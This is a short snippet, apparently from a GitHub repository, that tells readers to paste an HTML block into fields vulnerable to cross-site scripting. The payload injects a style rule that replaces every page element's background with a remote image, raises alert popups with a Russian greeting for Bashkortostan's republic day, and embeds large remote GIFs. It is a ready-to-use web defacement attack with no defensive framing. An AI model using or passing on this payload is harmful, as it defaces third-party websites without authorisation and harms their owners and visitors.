Paste this into XSS vulnerable fields.

```html
<script>const style = document.createElement('style');style.textContent = `*{background-image: url("https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/img/robots.jpg") !important;}`;document.head.appendChild(style);</script>
<script>alert("С ДНЕМ РЕСПУБЛИКИ БАШКОРТОСТАН!"); alert("...");</script>
<img src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/img/byvaet.gif" width="1000px" height="600px">
<img src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/img/bashcortostan.gif" width="1000px" height="600px">
```
